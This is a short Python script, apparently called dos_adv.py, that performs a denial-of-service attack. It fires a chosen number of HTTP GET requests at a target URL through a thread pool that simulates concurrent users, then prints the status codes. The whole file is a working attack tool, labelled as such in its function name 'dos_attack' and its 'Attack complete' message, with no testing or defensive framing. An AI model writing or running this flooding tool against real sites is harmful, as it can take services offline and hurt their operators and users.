import requests
import sys
import concurrent.futures

def send_request(target_url):
    """Send a single HTTP get request and return the status code"""
    try:
        response = requests.get(target_url)
        return response.status_code
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

def dos_attack(target_url, number_requests,num_concurrent_users):
    """simulate a number of concurrent users performing dos attacks."""
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_concurrent_users) as executor:
        futures = [executor.submit(send_request, target_url) for _ in range(number_requests)]
        results = [future.result() for future in concurrent.futures.as_completed(futures)]
    
    print(f"Attack complete. Results: {results}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python dos_adv.py <target_url> <number_requests> <num_concurrent_users>")
        sys.exit(1)
    target_url = sys.argv[1]
    num_requests = int(sys.argv[2])
    num_concurrent_users = int(sys.argv[3])
    dos_attack(target_url, num_requests,num_concurrent_users)
        